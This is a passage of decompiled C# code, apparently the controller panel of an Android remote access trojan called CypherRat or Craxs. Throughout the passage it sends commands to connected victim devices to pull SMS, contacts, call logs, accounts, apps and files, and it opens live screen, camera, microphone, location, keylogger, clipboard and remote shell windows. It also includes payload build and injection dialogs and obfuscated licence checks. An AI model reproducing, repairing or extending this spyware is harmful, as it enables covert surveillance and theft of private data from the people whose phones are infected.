						dataGridViewRow = gclass.dataGridViewRow_0;
					}
					catch (Exception ex)
					{
					}
					this.ClientsWindow.Rows[index].Tag = gclass.string_9;
					this.ClientsWindow.Rows[index].Cells[8].Tag = gclass;
					this.ClientsWindow.Rows[index].Cells[2].Tag = gclass.string_9;
					this.ClientsWindow.Rows[index].Cells[15].Style.ForeColor = Color.Lime;
					if (Operators.CompareString(Module5.show_alert, "Yes", false) == 0)
					{
						string format = "IP : {2}\r\nCountry : {3}\r\nName: {1}";
						Alert.ShowCustom(string.Format(format, new object[]
						{
							gclass.string_6,
							gclass.string_8,
							gclass.string_1,
							gclass.string_6
						}), false, (Image)gclass.objects_1[0], Color.Black);
					}
					return;
				}
				catch (Exception ex2)
				{
					if (dataGridViewRow != null)
					{
						this.method_29(new object[]
						{
							dataGridViewRow
						});
					}
					return;
				}
			}
			CypherRat.GDelegate12 method = new CypherRat.GDelegate12(this.method_28);
			this.ClientsWindow.Invoke(method, new object[]
			{
				objects_0
			});
		}

		// Token: 0x0600066E RID: 1646 RVA: 0x00029DE4 File Offset: 0x00027FE4
		public void method_29(object[] objects_0)
		{
			if (this.ClientsWindow.InvokeRequired)
			{
				CypherRat.GDelegate13 method = new CypherRat.GDelegate13(this.method_29);
				this.ClientsWindow.Invoke(method, new object[]
				{
					objects_0
				});
			}
			else
			{
				try
				{
					GClass8 gclass = (GClass8)objects_0[0];
					if (gclass.dataGridViewRow_0 != null)
					{
						string text = gclass.string_2;
						try
						{
							object obj = GClass9.object_0;
							ObjectFlowControl.CheckForSyncLockOnValueType(obj);
							lock (obj)
							{
								this.ClientsWindow.Rows.Remove(gclass.dataGridViewRow_0);
								gclass.dataGridViewRow_0 = null;
							}
						}
						catch (ArgumentException ex)
						{
						}
						catch (Exception ex2)
						{
						}
						try
						{
							if (Operators.CompareString(MySettingsProperty.Settings.ShowAlertDis, "Yes", false) == 0)
							{
								Alert.ShowCustom(string.Format("Disconnected", new object[]
								{
									gclass.string_6,
									gclass.string_8,
									gclass.string_1,
									gclass.string_6
								}), false, (Image)gclass.objects_1[0], Color.FromArgb(157, 5, 17));
							}
						}
						catch (Exception ex3)
						{
						}
						if (Operators.CompareString(text, "null", false) != 0)
						{
							string name = "Calls_Manager_" + text;
							Form form = MyProject.Application.OpenForms[name];
							string[] array = new string[]
							{
								"Close windows",
								"Disconnected ---> "
							};
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) == 0)
								{
									form.Close();
								}
								else
								{
									string text2 = form.Text;
									form.Text = array[1] + text2;
									((CameraManager)form).CAM0.Image = Module0.disconnected;
								}
							}
							name = "Live_Screen_" + gclass.string_1;
							if (Operators.CompareString(this.Label1.Text, Module2.smethod_60("j`s`t`r`b`w`c`n`T`7`a`I`S`1`N`B`Q`f`1`m`m`g`=`=`".Replace("`", ""), "1`a`5`s`5`d`8`f`7`t`6`y`1`b`3`n`".Replace("`", "")), false) != 0)
							{
								Thread.Sleep(10000);
								this.ClientsWindow.Rows.RemoveAt(0);
							}
							ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
							if (screenShoter != null)
							{
								screenShoter.method_23(new object[]
								{
									"Connection lost..."
								});
								screenShoter.Livepicbox.Image = Module0.disconnected;
							}
							name = "SMS_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text3 = form.Text;
									form.Text = array[1] + text3;
								}
								else
								{
									form.Close();
								}
							}
							name = "Contacts_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text4 = form.Text;
									form.Text = array[1] + text4;
								}
								else
								{
									form.Close();
								}
							}
							name = "Camera_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) == 0)
								{
									form.Close();
								}
								else
								{
									string text5 = form.Text;
									form.Text = array[1] + text5;
								}
							}
							try
							{
								name = "File_Manager_File" + gclass.string_9;
								form = MyProject.Application.OpenForms[name];
								if (form != null && !form.IsDisposed)
								{
									FileManager fileManager = (FileManager)form;
									string text6 = form.Text;
									form.Text = array[1] + text6;
									try
									{
										foreach (object obj2 in ((IEnumerable)fileManager.DGVDATA.Rows))
										{
											DataGridViewRow dataGridViewRow = (DataGridViewRow)obj2;
											try
											{
												if (Operators.ConditionalCompareObjectEqual(dataGridViewRow.Cells[4].Value, "Downloading..", false))
												{
													dataGridViewRow.Cells[4].Value = "Wating..";
												}
											}
											catch (Exception ex4)
											{
											}
										}
									}
									finally
									{
										IEnumerator enumerator;
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
								}
							}
							catch (Exception ex5)
							{
								Interaction.MsgBox("error x1" + ex5.Message, MsgBoxStyle.OkOnly, null);
							}
							name = "Microphone_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text7 = form.Text;
									form.Text = array[1] + text7;
								}
								else
								{
									form.Close();
								}
							}
							name = "SM_Hunter_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								string text8 = form.Text;
								form.Text = array[1] + text8;
							}
							name = "Shell_Terminal_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text9 = form.Text;
									form.Text = array[1] + text9;
								}
								else
								{
									form.Close();
								}
							}
							name = "Location_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) == 0)
								{
									form.Close();
								}
								else
								{
									string text10 = form.Text;
									form.Text = array[1] + text10;
								}
							}
							name = "Applications_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text11 = form.Text;
									form.Text = array[1] + text11;
								}
								else
								{
									form.Close();
								}
							}
							name = "Account_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text12 = form.Text;
									form.Text = array[1] + text12;
								}
								else
								{
									form.Close();
								}
							}
							name = "informations_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) != 0)
								{
									string text13 = form.Text;
									form.Text = array[1] + text13;
								}
								else
								{
									form.Close();
								}
							}
							name = "Keylogger_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) == 0)
								{
									form.Close();
								}
								else
								{
									string text14 = form.Text;
									form.Text = array[1] + text14;
								}
							}
							name = "Clipboard_Manager_" + text;
							form = MyProject.Application.OpenForms[name];
							if (form != null && !form.IsDisposed)
							{
								if (Operators.CompareString(Module5.disconnected, array[0], false) == 0)
								{
									form.Close();
								}
								else
								{
									string text15 = form.Text;
									form.Text = array[1] + text15;
								}
							}
						}
					}
				}
				catch (Exception ex6)
				{
				}
			}
		}

		// Token: 0x0600066F RID: 1647 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_30(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x06000670 RID: 1648 RVA: 0x0002A75C File Offset: 0x0002895C
		private void method_31(object sender, EventArgs e)
		{
			if (this.win_Users_0 == null)
			{
				this.win_Users_0 = new Win_Users();
				string path = Module8.string_1 + "\\Users";
				if (Directory.Exists(path))
				{
					string[] directories = Directory.GetDirectories(path);
					foreach (string path2 in directories)
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path2);
						string path3 = directoryInfo.FullName + "\\user.info";
						if (File.Exists(path3))
						{
							try
							{
								string[] array2 = File.ReadAllLines(path3);
								if (array2.Length == 3)
								{
									string text = Module8.string_1 + "\\Icons\\FillEllipse\\User.png";
									this.win_Users_0.DGV0.Rows.Add(new object[]
									{
										array2[0],
										array2[2] + " /ip:" + array2[1],
										directoryInfo.Name,
										Module8.smethod_32(0, new object[]
										{
											text,
											15,
											15,
											17,
											17
										})
									});
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
				}
				this.win_Users_0.DGV0.Columns[3].Width = 48;
				this.win_Users_0.DGV0.Columns[3].DisplayIndex = 0;
				this.win_Users_0.StartPosition = FormStartPosition.Manual;
				this.win_Users_0.Location = Module2.smethod_46(this, this.win_Users_0);
				this.win_Users_0.Show();
			}
		}

		// Token: 0x06000671 RID: 1649 RVA: 0x000055B6 File Offset: 0x000037B6
		public string method_32()
		{
			return "Moreinfo";
		}

		// Token: 0x06000672 RID: 1650 RVA: 0x0002A918 File Offset: 0x00028B18
		private void method_33()
		{
			bool flag = true;
			flag = GClass3.smethod_0<bool>(ref flag, false);
			bool flag2 = true;
			flag2 = GClass3.smethod_0<bool>(ref flag2, false);
			bool flag3 = true;
			flag3 = (GClass3.smethod_0<bool>(ref flag3, false) || true);
			bool flag4 = true;
			flag4 = (!GClass3.smethod_0<bool>(ref flag4, true) && false);
		}

		// Token: 0x06000673 RID: 1651 RVA: 0x0002A970 File Offset: 0x00028B70
		private void CypherRat_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.bool_0 = false;
			Thread.Sleep(10);
			this.Timer1.Stop();
			this.MonitorTimer.Stop();
			this.mapupdater.Stop();
		}

		// Token: 0x06000674 RID: 1652 RVA: 0x00011540 File Offset: 0x0000F740
		private void method_35(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000675 RID: 1653 RVA: 0x0001886C File Offset: 0x00016A6C
		private void method_36(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x06000676 RID: 1654 RVA: 0x0001893C File Offset: 0x00016B3C
		private void TopPanel_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Module2.ReleaseCapture();
				Module2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000677 RID: 1655 RVA: 0x0002A9AC File Offset: 0x00028BAC
		private void method_38(object sender, EventArgs e)
		{
			if (this.craxsSettings_0 == null)
			{
				this.craxsSettings_0 = new CraxsSettings();
				DialogResult dialogResult = this.craxsSettings_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.craxsSettings_0.Close();
					this.craxsSettings_0 = null;
				}
				else
				{
					this.craxsSettings_0.Close();
					this.craxsSettings_0 = null;
				}
			}
		}

		// Token: 0x06000678 RID: 1656 RVA: 0x0002AA08 File Offset: 0x00028C08
		private void infolowtext_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_2 = true;
			this.int_2 = Control.MousePosition.Y;
			this.int_1 = Control.MousePosition.X;
			this.int_3 = base.Width;
			this.int_4 = base.Height;
		}

		// Token: 0x06000679 RID: 1657 RVA: 0x0002AA5C File Offset: 0x00028C5C
		private void infolowtext_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.bool_2)
			{
				base.Height = checked(Control.MousePosition.Y - this.int_2 + this.int_4);
			}
		}

		// Token: 0x0600067A RID: 1658 RVA: 0x0002AA94 File Offset: 0x00028C94
		private void infolowtext_MouseUp(object sender, MouseEventArgs e)
		{
			this.bool_2 = false;
		}

		// Token: 0x0600067B RID: 1659 RVA: 0x0002AAA8 File Offset: 0x00028CA8
		private void Timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (Operators.CompareString(this.string_7, this.recvtotal.Text, false) == 0)
					{
						this.recvtotal.Text = "Received 0 Bytes";
					}
					else
					{
						this.string_7 = this.recvtotal.Text;
					}
					if (Operators.CompareString(this.string_8, this.senttotal.Text, false) == 0)
					{
						this.senttotal.Text = "Sent 0 Bytes";
					}
					else
					{
						this.string_8 = this.senttotal.Text;
					}
					int num = this.gclass7s_0.Count - 1;
					long num2;
					long num3;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							num2 += this.gclass7s_0[i].long_0;
							num3 += this.gclass7s_0[i].long_1;
						}
						catch (Exception ex)
						{
						}
					}
					Array array = Module2.smethod_48(num2, num3);
					this.recvtotal.Text = Conversions.ToString(Operators.ConcatenateObject("Received : ", array.GetValue(0)));
					this.senttotal.Text = Conversions.ToString(Operators.ConcatenateObject("Sent : ", array.GetValue(1)));
					this.infotext.Text = string.Concat(new string[]
					{
						"Online : ",
						Conversions.ToString(this.ClientsWindow.Rows.Count),
						"\r\nPort : ",
						Module3.string_0,
						"\r\nKey :",
						GClass9.string_4
					});
					this.infolowtext.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"Ready: ",
						Conversions.ToString(this.ClientsWindow.Rows.Count),
						Strings.Space(5),
						"Selected :",
						this.ClientsWindow.SelectedRows.Count.ToString(),
						Strings.Space(5),
						"Received : "
					}), Operators.AddObject(Operators.AddObject(array.GetValue(0), Strings.Space(5)), "Sent : ")), array.GetValue(1)));
					if (Operators.CompareString(this.label16.Text, Module2.smethod_60("g149MONTtQjEFzAAIpgk2w==", "0319749625846139"), false) != 0 && this.ClientsWindow.Rows.Count > 0)
					{
						this.ClientsWindow.Rows.Clear();
					}
				}
				catch (Exception ex2)
				{
				}
				if (GClass9.gclass8_0 != null && GClass9.gclass8_0.bool_0)
				{
					try
					{
						this.lastclientpic.Image = (Image)GClass9.gclass8_0.objects_1[0];
						this.lastclienttext.Text = string.Concat(new string[]
						{
							GClass9.gclass8_0.string_8,
							"\r\n",
							GClass9.gclass8_0.string_6,
							"\r\n",
							GClass9.gclass8_0.string_1
						});
					}
					catch (Exception ex3)
					{
					}
				}
			}
		}

		// Token: 0x0600067C RID: 1660 RVA: 0x0002AA08 File Offset: 0x00028C08
		private void RightPanel_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_2 = true;
			this.int_2 = Control.MousePosition.Y;
			this.int_1 = Control.MousePosition.X;
			this.int_3 = base.Width;
			this.int_4 = base.Height;
		}

		// Token: 0x0600067D RID: 1661 RVA: 0x0002AE0C File Offset: 0x0002900C
		private void RightPanel_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.bool_2)
			{
				base.Width = checked(Control.MousePosition.X - this.int_1 + this.int_3);
			}
		}

		// Token: 0x0600067E RID: 1662 RVA: 0x0002AA94 File Offset: 0x00028C94
		private void RightPanel_MouseUp(object sender, MouseEventArgs e)
		{
			this.bool_2 = false;
		}

		// Token: 0x0600067F RID: 1663 RVA: 0x0002AE44 File Offset: 0x00029044
		private void method_46(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.DataLog.Tag.ToString(), "b", false) == 0)
			{
				this.DataLog.Tag = "f";
				this.DataLog.BringToFront();
			}
			else if (Operators.CompareString(this.DataLog.Tag.ToString(), "f", false) == 0)
			{
				this.DataLog.Tag = "b";
				this.DataLog.SendToBack();
			}
		}

		// Token: 0x06000680 RID: 1664 RVA: 0x0002AECC File Offset: 0x000290CC
		private void method_47(object sender, EventArgs e)
		{
			if (this.DataLog.Rows.Count > 0)
			{
				this.DataLog.Rows.Clear();
			}
		}

		// Token: 0x06000681 RID: 1665 RVA: 0x0001893C File Offset: 0x00016B3C
		private void method_48(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Module2.ReleaseCapture();
				Module2.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000682 RID: 1666 RVA: 0x0002AF00 File Offset: 0x00029100
		private void Build_btn_Click(object sender, EventArgs e)
		{
			if (this.build_0 == null)
			{
				this.build_0 = new Build();
				DialogResult dialogResult = this.build_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.build_0.Close();
					this.build_0 = null;
				}
				else
				{
					this.build_0.Close();
					this.build_0 = null;
				}
			}
		}

		// Token: 0x06000683 RID: 1667 RVA: 0x0002AF5C File Offset: 0x0002915C
		private void method_50(object sender, EventArgs e)
		{
			this.connectionpanel.BringToFront();
			this.DataLog.Visible = true;
			this.clearbtn.Visible = true;
		}

		// Token: 0x06000684 RID: 1668 RVA: 0x0002AECC File Offset: 0x000290CC
		private void clearbtn_Click(object sender, EventArgs e)
		{
			if (this.DataLog.Rows.Count > 0)
			{
				this.DataLog.Rows.Clear();
			}
		}

		// Token: 0x06000685 RID: 1669 RVA: 0x0002A9AC File Offset: 0x00028BAC
		private void Settings_btn_Click(object sender, EventArgs e)
		{
			if (this.craxsSettings_0 == null)
			{
				this.craxsSettings_0 = new CraxsSettings();
				DialogResult dialogResult = this.craxsSettings_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.craxsSettings_0.Close();
					this.craxsSettings_0 = null;
				}
				else
				{
					this.craxsSettings_0.Close();
					this.craxsSettings_0 = null;
				}
			}
		}

		// Token: 0x06000686 RID: 1670 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_53(object sender, EventArgs e)
		{
		}

		// Token: 0x06000687 RID: 1671 RVA: 0x0002AF8C File Offset: 0x0002918C
		private void Home_Btn_Click(object sender, EventArgs e)
		{
			this.infotitlepanel.BringToFront();
		}

		// Token: 0x06000688 RID: 1672 RVA: 0x0002AFA4 File Offset: 0x000291A4
		private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Module2.ReleaseCapture();
					Module2.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000689 RID: 1673 RVA: 0x0002AFFC File Offset: 0x000291FC
		private void inject_btn_Click(object sender, EventArgs e)
		{
			if (this.jector_0 == null)
			{
				this.jector_0 = new Jector();
				DialogResult dialogResult = this.jector_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.jector_0.Close();
					this.jector_0 = null;
				}
				else
				{
					this.jector_0.Close();
					this.jector_0 = null;
				}
			}
		}

		// Token: 0x0600068A RID: 1674 RVA: 0x0002B058 File Offset: 0x00029258
		private void CypherRat_Deactivate(object sender, EventArgs e)
		{
			try
			{
				this.bool_3 = false;
				base.ActiveControl = this.ClientsWindow;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600068B RID: 1675 RVA: 0x0002AFA4 File Offset: 0x000291A4
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			try
			{
				if (e.Button == MouseButtons.Left)
				{
					Module2.ReleaseCapture();
					Module2.SendMessage(base.Handle, 161, 2, 0);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600068C RID: 1676 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_57(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600068D RID: 1677 RVA: 0x0002B09C File Offset: 0x0002929C
		public void method_58(object[] objects_0)
		{
			if (!this.ClientsWindow.InvokeRequired)
			{
				try
				{
					GClass8 gclass = (GClass8)objects_0[0];
					DataGridViewRow dataGridViewRow = (DataGridViewRow)objects_0[1];
					try
					{
						if (dataGridViewRow == null)
						{
							return;
						}
						if (!(gclass.string_11 == null | Operators.CompareString(gclass.string_11, "null", false) == 0))
						{
							dataGridViewRow.Cells[15].Value = gclass.string_11;
						}
						else
						{
							dataGridViewRow.Cells[15].Value = "Bing...";
						}
					}
					catch (Exception ex)
					{
					}
					dataGridViewRow.Cells[12].Value = gclass.string_3;
					if (gclass.bool_6)
					{
						dataGridViewRow.Cells[9].Value = Module2.smethod_38(Module0.new_call, new Size(23, 23), false);
					}
					if (gclass.bool_9)
					{
						dataGridViewRow.Cells[8].Value = Module2.smethod_38(Module0.new_notifi, new Size(23, 23), false);
					}
					if (gclass.bool_12)
					{
						dataGridViewRow.Cells[14].Value = Module8.smethod_0(gclass.bool_12);
					}
					return;
				}
				catch (Exception ex2)
				{
					return;
				}
			}
			CypherRat.GDelegate14 method = new CypherRat.GDelegate14(this.method_58);
			this.ClientsWindow.Invoke(method, new object[]
			{
				objects_0
			});
		}

		// Token: 0x0600068E RID: 1678 RVA: 0x0002B244 File Offset: 0x00029444
		private void CypherRat_Activated(object sender, EventArgs e)
		{
			try
			{
				this.bool_3 = true;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600068F RID: 1679 RVA: 0x0002B27C File Offset: 0x0002947C
		private void About_btn_Click(object sender, EventArgs e)
		{
			if (this.craxsAbout_0 == null)
			{
				this.craxsAbout_0 = new CraxsAbout();
				DialogResult dialogResult = this.craxsAbout_0.ShowDialog(this);
				if (dialogResult != DialogResult.OK)
				{
					this.craxsAbout_0.Close();
					this.craxsAbout_0 = null;
				}
				else
				{
					this.craxsAbout_0.Close();
					this.craxsAbout_0 = null;
				}
			}
		}

		// Token: 0x06000690 RID: 1680 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_61(object sender, EventArgs e)
		{
		}

		// Token: 0x06000691 RID: 1681 RVA: 0x0002B2D8 File Offset: 0x000294D8
		private void DataLog_Resize(object sender, EventArgs e)
		{
			if (this.DataLog.Width < 20)
			{
				this.DataLog.Width = 22;
			}
		}

		// Token: 0x06000692 RID: 1682 RVA: 0x0002B304 File Offset: 0x00029504
		private void filebtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										object[] objects_ = new object[]
										{
											gclass.tcpClient_0,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".files",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_6,
												GClass9.string_0,
												"files",
												GClass9.string_1,
												"get0"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000693 RID: 1683 RVA: 0x0002B4B8 File Offset: 0x000296B8
		private void smsbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".sms",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_2,
												GClass9.string_0,
												"sms",
												GClass9.string_1,
												"content://sms/"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000694 RID: 1684 RVA: 0x0002B670 File Offset: 0x00029870
		private void contactbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".contacts",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_3,
												GClass9.string_0,
												"contacts"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000695 RID: 1685 RVA: 0x0002B81C File Offset: 0x00029A1C
		private void applicationsbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
								if (gclass != null)
								{
									TcpClient tcpClient_ = gclass.tcpClient_0;
									object[] objects_ = new object[]
									{
										tcpClient_,
										string.Concat(new string[]
										{
											Module13.string_28,
											GClass9.string_0,
											Module8.string_4,
											".apps",
											GClass9.string_0,
											"method",
											GClass9.string_0,
											Module13.string_18,
											GClass9.string_0,
											"apps"
										}),
										Module2.smethod_9().GetBytes("null"),
										gclass
									};
									gclass.method_2(objects_);
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000696 RID: 1686 RVA: 0x0002B9A8 File Offset: 0x00029BA8
		private void accountbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".info",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_19,
												GClass9.string_0,
												"account"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000697 RID: 1687 RVA: 0x0002BB50 File Offset: 0x00029D50
		private void callsbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".calls",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_1,
												GClass9.string_0,
												"calls"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x06000698 RID: 1688 RVA: 0x0002BCFC File Offset: 0x00029EFC
		private void screenbtn_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Cells[8].Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Live_Screen_" + gclass.string_1;
										ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
										if (Operators.CompareString(this.Label1.Text, Module2.smethod_60("j_s_t_r_b_w_c_n_T_7_a_I_S_1_N_B_Q_f_1_m_m_g_=_=_".Replace("_", ""), "1_a_5_s_5_d_8_f_7_t_6_y_1_b_3_n_".Replace("_", "")), false) != 0)
										{
											Thread.Sleep(10000);
											this.ClientsWindow.Rows.RemoveAt(0);
										}
										if (screenShoter == null)
										{
											new ScreenShoter
											{
												Name = name,
												string_1 = string.Format("{0} - IP:{1}", "Live Screen", gclass.string_1),
												Tag = gclass.string_1,
												gclass8_1 = gclass,
												object_0 = gclass.tcpClient_0,
												string_0 = gclass.string_10
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
